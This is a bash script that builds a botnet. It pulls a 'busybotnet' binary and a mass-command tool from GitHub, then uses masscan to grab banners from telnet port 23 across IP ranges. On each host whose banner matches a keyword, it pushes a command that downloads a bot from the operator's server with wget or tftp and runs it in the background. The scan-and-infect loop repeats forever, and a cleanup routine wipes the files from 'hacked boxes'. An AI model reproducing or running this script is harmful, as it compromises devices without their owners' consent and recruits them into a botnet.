#!/bin/bash
server="your.ircd.or.whatever.com"
keywords="$@"  # or hardcode them in

if [[ "$#" -eq "0" ]] ; then
  echo "Usage: $0 \"keywords\\|go\\|here\\|in\\|this\\|\\greppale\\|format\" "
  exit 1
fi

wget -O busybotnet https://github.com/isdrupter/busybotnet/raw/master/binaries/busybotnet-x64
mkdir bin;mv busybox bin ;chmod +x bin/busybox;bin/busybox --install -s bin
wget -O pycc https://raw.githubusercontent.com/isdrupter/evilsh/master/autobots/pycc
chmod +x pycc

echo -n '
#ip ranges to scan here
1.2.3.0/24
2.3.4.0/24
4.5.0.0/16
' >inc




finish() {
# in case you're running this on a hacked box and loose your shell
  srm ./* || rm -f ./*
}

run(){
mslst=ms.out
iptables -A INPUT -p tcp --dport 60000 -j DROP # need this for banner grabbing
bin/masscan -p23 --banners --rate=1000 --open -iL inc -oG $mslst --source-port=60000 #use masscan to banner grab

grep "$keywords" $mslst | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" > final # after the scan, search banners for keywords, than grab the ip addresses
# you need to edit your command probably 
cmd="cd /tmp;(wget -O bot $server || tftp -g -r bot $server);chmod +x bot;trap '' 1;./bot &"
./pycc -m s -l final -t 1000 -c "$cmd" -T 30 # join them up
}

#trap "finish" INT TERM EXIT # uncomment to delete everything on interupt
(while true;do run;sleep 5;done) # do this forever and ever
